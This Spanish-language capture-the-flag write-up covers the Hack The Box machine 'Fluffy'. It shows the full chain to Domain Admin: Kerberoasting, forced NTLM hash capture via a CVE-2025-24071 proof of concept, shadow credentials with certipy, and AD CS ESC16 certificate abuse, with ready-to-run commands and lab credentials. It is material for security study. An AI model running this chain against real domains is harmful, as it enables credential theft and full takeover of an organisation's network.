Fluffy

Kerberoasting, Shadow Credentials y AD CS ESC16

Dificultad: Media · Objetivo: Domain Admin

Resumen técnico

El compromiso inicia con credenciales válidas de bajo privilegio para el dominio fluffy.htb. A partir de esa identidad se ejecuta reconocimiento LDAP/SMB, se enumeran cuentas de servicio y se evalúa Kerberoasting. Aunque los tickets TGS no se rompen inicialmente por diccionario, se descubre un recurso compartido con un PDF interno que expone referencias de CVE aprovechables en el entorno.

Mediante la PoC de CVE-2025-24071 se fuerza una autenticación SMB saliente y se captura un hash NTLMv2 de p.agila, el cual sí se crackea. Con esa cuenta se explotan relaciones de grupos para abusar de shadow credentials sobre cuentas de servicio, conseguir acceso WinRM y finalmente escalar por AD CS ESC16 hasta obtener autenticación como administrator.

1) Enumeración inicial

El escaneo de puertos mostró un controlador de dominio típico: 53, 88, 389, 445, 636, 3268, 3269 y 9389. La firma SMB confirmó dominio fluffy.htb y autenticación nula habilitada para ciertas operaciones de descubrimiento. 

nxc smb 10.129.28.13 -u j.fleischman -p 'J0elTHEM4n1990!'
nxc ldap 10.129.28.13 -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting output.txt

Se sincronizó la hora con el DC antes de pruebas Kerberos para evitar errores de reloj. Después se ejecutó rusthound-ce para exportar JSON compatibles con BloodHound CE y visualizar relaciones de abuso.

2) Hallazgo clave en SMB y captura de credenciales

En el recurso compartido IT se encontró Upgrade_Notice.pdf con referencias a CVEs. La investigación condujo a un vector donde un archivo .library-ms empaquetado desencadena conexión SMB automática durante el procesamiento del Explorador de Windows. 

smbclient -U j.fleischman -L //fluffy.htb
# subida del zip PoC al recurso SMB
# escucha de hashes con responder en tun0

La técnica permitió capturar hash NTLMv2 de p.agila y crackearlo con diccionario, obteniendo la contraseña prometheusx-303.

3) Abuso de grupos y Shadow Credentials

En BloodHound se validó que p.agila podía encadenar privilegios hacia cuentas de servicio. Se añadió temporalmente al grupo service accounts y se explotó certipy shadow auto sobre winrm_svc y ca_svc para obtener material de autenticación sin rotar contraseñas. 

bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host 10.129.243.25 add groupMember 'service accounts' p.agila
certipy shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc
evil-winrm -i 10.129.243.25 -u winrm_svc -H <NTLM_HASH>

4) Escalada final con AD CS (ESC16)

Con acceso a ca_svc se enumeraron plantillas vulnerables y se aplicó la técnica ESC16. El flujo consistió en modificar temporalmente UPN para solicitar un certificado con identidad privilegiada, restaurar atributos y autenticar con el PFX emitido. 

certipy find -username ca_svc -hashes :<hash> -dc-ip 10.129.243.25 -vulnerable
certipy account -u p.agila -p prometheusx-303 -dc-ip 10.129.243.25 -user ca_svc -upn administrator update
certipy req -u ca_svc -hashes :<hash> -ca FLUFFY-DC01-CA -template User -upn administrator -dc-ip 10.129.243.25
certipy auth -dc-ip 10.129.243.25 -pfx administrator.pfx -username administrator -domain fluffy.htb

Con el hash final de administrator se obtuvo sesión remota y control total del dominio.
